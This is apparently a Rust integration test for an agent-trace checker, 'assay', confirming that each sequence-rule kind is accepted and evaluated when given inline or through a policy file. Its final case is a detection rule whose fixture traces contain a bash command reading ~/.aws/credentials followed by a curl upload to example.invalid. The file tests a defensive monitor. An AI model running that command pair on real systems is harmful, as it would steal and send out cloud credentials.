//! Contract: `assay run` executes every sequence-rule kind the configuration reference documents,
//! inline and through a `policy:` file, and reports each rule's outcome.
//!
//! #1948 refused five kinds (`eventually`, `max_calls`, `after`, `never_after`, `sequence`) when a
//! config was parsed. At the time `sequence_valid` passed them through a `_` arm, so the refusal
//! was right. #2112 then made the metric hand every kind to
//! `assay_core::sequence_eval::evaluate_rules`, but left the refusal in place. From then on
//! `assay run` and `assay validate` rejected, with `E_CFG_PARSE`, rules that the metric could
//! evaluate. That included the argument-scoped `never_after` that ADR-047 was written to make
//! expressible.
//!
//! These tests drive the real binary over real traces, because the metric's own unit tests call
//! the metric directly and never reach the config parser that refused the rule. Each case names a
//! violating, a holding and (where the kind can be undecided) a vacuous trace, and pins the
//! outcome `evaluate_rules` gives on a finished run.

use assay_core::model::SequenceRule;
use serde_json::{json, Value};
use std::collections::BTreeSet;
use std::path::Path;
use std::process::{Command, Output};

/// One call in a replayed trace: tool name and arguments.
type Call = (&'static str, Value);

/// What the gate must report for one trace.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Expect {
    /// `assay run` exits 1; the rule is `violated` with these spanned indices.
    Violated(&'static [usize]),
    /// `assay run` exits 0; the rule `held`.
    Held,
    /// `assay run` exits 0 and the metric says `not_exercised`: nothing in the trace decided it.
    NotExercised,
}

struct Case {
    /// The rule as one YAML flow mapping, used verbatim inline and in the policy file.
    rule: &'static str,
    traces: Vec<(Vec<Call>, Expect)>,
}

fn calls(names: &[&'static str]) -> Vec<Call> {
    names.iter().map(|n| (*n, json!({}))).collect()
}

fn cases() -> Vec<Case> {
    vec![
        Case {
            rule: "{ type: require, tool: B }",
            traces: vec![
                (calls(&["A", "A"]), Expect::Violated(&[])),
                (calls(&["A", "B"]), Expect::Held),
            ],
        },
        Case {
            rule: "{ type: before, first: A, then: B }",
            traces: vec![
                (calls(&["B", "A"]), Expect::Violated(&[1, 0])),
                (calls(&["A", "B"]), Expect::Held),
                (calls(&["C"]), Expect::NotExercised),
            ],
        },
        Case {
            rule: "{ type: blocklist, pattern: admin_ }",
            traces: vec![
                (calls(&["A", "admin_delete"]), Expect::Violated(&[1])),
                (calls(&["A", "B"]), Expect::Held),
            ],
        },
        Case {
            rule: "{ type: eventually, tool: B, within: 2 }",
            traces: vec![
                (calls(&["A", "A", "B"]), Expect::Violated(&[2])),
                (calls(&["A", "B"]), Expect::Held),
            ],
        },
        Case {
            rule: "{ type: max_calls, tool: A, max: 1 }",
            traces: vec![
                (calls(&["A", "B", "A"]), Expect::Violated(&[0, 2])),
                (calls(&["A", "B"]), Expect::Held),
            ],
        },
        Case {
            rule: "{ type: after, trigger: A, then: B, within: 1 }",
            traces: vec![
                (calls(&["A", "C", "B"]), Expect::Violated(&[0])),
                (calls(&["A", "B"]), Expect::Held),
                (calls(&["C"]), Expect::NotExercised),
            ],
        },
        Case {
            rule: "{ type: never_after, trigger: A, forbidden: B }",
            traces: vec![
                (calls(&["A", "B"]), Expect::Violated(&[0, 1])),
                (calls(&["B", "A"]), Expect::Held),
                (calls(&["C"]), Expect::NotExercised),
            ],
        },
        Case {
            rule: "{ type: sequence, tools: [A, B] }",
            traces: vec![
                (calls(&["B", "A"]), Expect::Violated(&[0])),
                (calls(&["A", "C", "B"]), Expect::Held),
                (calls(&["C"]), Expect::NotExercised),
            ],
        },
        // ADR-047's motivating correlation: both halves are `bash`, told apart by their arguments.
        Case {
            rule: r#"{ type: never_after, trigger: { tool: bash, args_match: { command: "\\.aws/credentials" } }, forbidden: { tool: bash, args_match: { command: "^curl .*-d" } } }"#,
            traces: vec![
                (
                    vec![
                        ("bash", json!({"command": "cat ~/.aws/credentials"})),
                        (
                            "bash",
                            json!({"command": "curl https://example.invalid -d @-"}),
                        ),
                    ],
                    Expect::Violated(&[0, 1]),
                ),
                (
                    vec![
                        (
                            "bash",
                            json!({"command": "curl https://example.invalid -d @-"}),
                        ),
                        ("bash", json!({"command": "cat ~/.aws/credentials"})),
                    ],
                    Expect::Held,
                ),
                (
                    vec![("bash", json!({"command": "ls"}))],
                    Expect::NotExercised,
                ),
            ],
        },
    ]
}

/// The kind name of a parsed rule. Exhaustive on purpose: a new `SequenceRule` variant does not
/// compile here until someone decides how this contract covers it.
fn kind(rule: &SequenceRule) -> &'static str {
    match rule {
        SequenceRule::Require { .. } => "require",
        SequenceRule::Eventually { .. } => "eventually",
        SequenceRule::MaxCalls { .. } => "max_calls",
        SequenceRule::Before { .. } => "before",
        SequenceRule::After { .. } => "after",
        SequenceRule::NeverAfter { .. } => "never_after",
        SequenceRule::Sequence { .. } => "sequence",
        SequenceRule::Blocklist { .. } => "blocklist",
    }
}

#[derive(Debug, Clone, Copy)]
enum Route {
    Inline,
    PolicyFile,
}

fn trace_jsonl(trace: &[Call]) -> String {
    let mut lines = vec![json!({
        "type": "episode_start", "episode_id": "e1", "timestamp": 1000,
        "input": {"prompt": "seq"}
    })];
    for (i, (tool, args)) in trace.iter().enumerate() {
        lines.push(json!({
            "type": "tool_call", "episode_id": "e1", "step_id": format!("s{i}"),
            "timestamp": 1001 + i as u64, "tool_name": tool, "call_index": i, "args": args
        }));
    }
    lines.push(json!({
        "type": "episode_end", "episode_id": "e1",
        "timestamp": 2000, "final_output": "done"
    }));
    lines.iter().map(|l| format!("{l}\n")).collect()
}

fn write_config(dir: &Path, rule: &str, route: Route) {
    let expected = match route {
        Route::Inline => format!("      type: sequence_valid\n      rules:\n        - {rule}\n"),
        Route::PolicyFile => {
            std::fs::write(dir.join("policy.yaml"), format!("- {rule}\n")).expect("policy.yaml");
            "      type: sequence_valid\n      policy: policy.yaml\n".to_string()
        }
    };
    let config = format!(
        "configVersion: 1\nsuite: sequence_rule_kinds\nmodel: trace\nsettings:\n  cache: false\n\
         tests:\n  - id: rule_under_test\n    input:\n      prompt: \"seq\"\n    expected:\n{expected}"
    );
    std::fs::write(dir.join("eval.yaml"), config).expect("eval.yaml");
}

fn assay(dir: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_assay"))
        .current_dir(dir)
        .env("ASSAY_EXIT_CODES", "v2")
        .env("ASSAY_VCR_MODE", "off")
        .args(args)
        .output()
        .expect("run assay binary")
}

fn describe(out: &Output) -> String {
    format!(
        "exit={:?}\nstderr:\n{}",
        out.status.code(),
        String::from_utf8_lossy(&out.stderr)
    )
}

/// Run one rule over one trace and check the exit code and the recorded rule outcome.
fn check(rule: &str, route: Route, trace: &[Call], expect: Expect) {
    let dir = tempfile::tempdir().expect("tempdir");
    write_config(dir.path(), rule, route);
    std::fs::write(dir.path().join("trace.jsonl"), trace_jsonl(trace)).expect("trace.jsonl");
    let label = format!("rule {rule} via {route:?} over {trace:?}");

    let validate = assay(dir.path(), &["validate", "--config", "eval.yaml"]);
    assert_eq!(
        validate.status.code(),
        Some(0),
        "assay validate refused {label}\n{}",
        describe(&validate)
    );

    let run = assay(
        dir.path(),
        &[
            "run",
            "--config",
            "eval.yaml",
            "--trace-file",
            "trace.jsonl",
            "--db",
            ":memory:",
        ],
    );
    let want_exit = match expect {
        Expect::Violated(_) => 1,
        Expect::Held | Expect::NotExercised => 0,
    };
    assert_eq!(
        run.status.code(),
        Some(want_exit),
        "assay run gave the wrong exit for {label}\n{}",
        describe(&run)
    );

    let run_json: Value = serde_json::from_str(
        &std::fs::read_to_string(dir.path().join("run.json")).expect("run.json written"),
    )
    .expect("run.json is JSON");
    let metric = &run_json["results"][0]["details"]["metrics"]["sequence_valid"];
    let evaluations = metric["details"]["rule_evaluations"]
        .as_array()
        .unwrap_or_else(|| panic!("no rule_evaluations for {label}: {metric}"));
    assert_eq!(evaluations.len(), 1, "one rule, one record: {label}");
    let record = &evaluations[0];
    match expect {
        Expect::Violated(spanned) => {
            assert_eq!(record["outcome"], "violated", "{label}: {record}");
            assert_eq!(record["spanned"], json!(spanned), "{label}: {record}");
        }
        Expect::Held => assert_eq!(record["outcome"], "held", "{label}: {record}"),
        Expect::NotExercised => {
            assert_eq!(record["outcome"], "not_exercised", "{label}: {record}");
            assert_eq!(metric["exercised"], "not_exercised", "{label}: {metric}");
        }
    }
}

fn run_all(route: Route) {
    for case in cases() {
        for (trace, expect) in &case.traces {
            check(case.rule, route, trace, *expect);
        }
    }
}

#[test]
fn every_documented_rule_kind_is_covered_by_this_contract() {
    let covered: BTreeSet<&str> = cases()
        .iter()
        .map(|c| {
            let rule: SequenceRule = serde_yaml::from_str(c.rule)
                .unwrap_or_else(|e| panic!("case rule {} does not parse: {e}", c.rule));
            kind(&rule)
        })
        .collect();
    let all: BTreeSet<&str> = [
        "require",
        "eventually",
        "max_calls",
        "before",
        "after",
        "never_after",
        "sequence",
        "blocklist",
    ]
    .into_iter()
    .collect();
    assert_eq!(covered, all);
}

#[test]
fn assay_run_executes_every_rule_kind_inline() {
    run_all(Route::Inline);
}

#[test]
fn assay_run_executes_every_rule_kind_from_a_policy_file() {
    run_all(Route::PolicyFile);
}
